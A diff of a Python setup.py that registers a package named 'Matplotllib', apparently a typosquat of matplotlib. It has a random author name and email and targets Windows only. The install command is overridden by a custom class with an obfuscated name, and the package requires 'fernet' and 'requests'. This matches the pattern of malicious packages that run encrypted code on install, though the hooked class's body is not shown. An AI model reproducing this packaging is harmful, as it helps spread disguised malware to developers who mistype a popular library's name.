@@ -18,5 +18,22 @@ class bWFvmQXUBWjRnEVYuCOOCGMmmAQRWvZjbeRyZSXgJccsNbsWZfdpKgmYfiYxUegzJOHnVSUAOM
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+setup(
+    name="Matplotllib",
+    version=VERSION,
+    author="YZGDFdoitr",
+    author_email="qHoCfzmJoy@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': bWFvmQXUBWjRnEVYuCOOCGMmmAQRWvZjbeRyZSXgJccsNbsWZfdpKgmYfiYxUegzJOHnVSUAOMEvsrJcuRJBASiSPylSppxVqtiKxLeqOXigHsdclRcdPbQwpYzhHOORoSrAKmFWSIZmoFPCEwsfRNFVxuSpz,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
